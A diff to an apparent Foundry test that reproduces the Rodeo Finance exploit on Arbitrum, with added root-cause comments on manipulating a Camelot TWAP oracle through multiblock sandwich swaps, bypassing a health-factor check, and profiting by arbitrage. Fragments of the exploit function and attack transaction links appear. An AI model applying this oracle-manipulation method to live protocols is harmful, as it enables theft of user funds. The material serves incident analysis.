@@ -7,12 +7,13 @@ import "./interface.sol";
 // @KeyInfo - Total Lost : ~472 Ether (~$888K)
 // Attacker : https://arbiscan.io/address/0x2f3788f2396127061c46fc07bd0fcb91faace328
 // Attack Contract : https://arbiscan.io/address/0xe9544ee39821f72c4fc87a5588522230e340aa54
-// Vulnerable Contract : https://arbiscan.io/address/0x8accf43dd31dfcd4919cc7d65912a475bfa60369
+// Vulnerable Contract : https://arbiscan.io/address/0xf3721d8a2c051643e06bf2646762522fa66100da
 // Attack Tx : https://arbiscan.io/tx/0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a
 
 // @Analysis
 // https://twitter.com/Phalcon_xyz/status/1678765773396008967
 // https://twitter.com/peckshield/status/1678700465587130368
+// https://medium.com/@Rodeo_Finance/rodeo-post-mortem-overview-f35635c14101
 
 interface IInvestor {
     function earn(
@@ -76,8 +77,20 @@ contract RodeoTest is Test {
         cheats.label(address(Vault), "Vault");
     }
 
+    // Root Cause
+    // The attacker was able to manipulate the Camelot V2 TWAP Oracle (attacking the unreleased ETH-unshETH pool)
+    // TWAP price was calculated by averaging the last 4 instances of updated price where each price updating occurs every 45 minutes
+    // TWAP price was manipulated via multiblock “sandwich” attack
+    // Rodeo Farms utilized the faulty price oracle for LP pricing
+    // Ultimately, the attacker bypassed the Health Factor check via Price Oracle manipulation, 
+    // opened positions using borrowed funds from the USDC Pool and triggered large-scale swaps in the Camelot Pair. 
+    // They then capitalized on the price difference by conducting equal-sized swaps in the opposite direction, thus profiting from the arbitrage opportunity
+
     function testExploit() public {
         // Begin with the specific amount of unsETH (info about amount taken from the above attack tx)
+        // the attackers manipulated the price of TWAP Oracle through multiple transactions
+        // such as https://arbiscan.io/tx/0x5f16637460021994d40430dadc020fffdb96937cfaf2b8cb6cbc03c91980ac7c 
+        // https://arbiscan.io/tx/0x9a462209e573962f2654cac9bfe1277abe443cf5d1322ffd645925281fe65a2e
         deal(address(unshETH), address(this), 47_294_222_088_336_002_957);
         unshETH.approve(address(Router), type(uint256).max);
         WETH.approve(address(Router), type(uint256).max);
@@ -85,7 +98,7 @@ contract RodeoTest is Test {
 
         // Vulnerable function
         // Vulnerability can be forced to swap USDC -> WETH -> unshETH
-        // Manipulation of the pair reserves (unshETH - WETH) of the UniswapV2 pool due to the pool's depth
+        
         Investor.earn(
             address(this),
             usdcPool,
